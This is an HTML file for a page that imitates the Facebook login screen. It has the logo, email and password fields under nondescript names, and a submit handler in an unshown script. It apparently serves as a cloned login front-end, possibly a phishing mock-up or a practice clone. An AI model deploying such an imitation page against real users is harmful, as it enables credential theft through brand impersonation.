<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook login</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="./img/favicon.jpg" type="image/x-icon">
</head>

<body>
    <div class="container1">
        <div class="fb">
            <div class="container">
                <img src="./img/fb_logo.png" alt="fb logo" class="img">

            </div>

            <form onsubmit="fb(); ">
                <div class="input111">
                    <div class="input1">
                        <label for="qq"></label>
                        <input type="text" name="qq" class="input11" placeholder="Email or Phone">

                    </div>
                </div>
                <div class="input2">
                    <div class="input1">
                        <label for="aa"></label>
                        <input type="password" name="aa" class="input11" id="ee" placeholder="Password">

                    </div>
                </div>


                <div class="input3">
                    <div class="input33">

                        <!-- <BUtton:button>LOG IN</BUtton:button> -->
                        <button type="submit">LOG IN</button>

                    </div>
                </div>
            </form>
            <div class="pa" >
                <p>Sign Up for Facebook</p>
                <p>Forgot Password?</p>




            </div>
        </div>
    </div>
    <div id="output" target="blankspace" >
        <br>
        <p id="q3"></p>
        <p id="q4"></p>

    </div>
    <script src="index.js"></script>

</body>


</html>
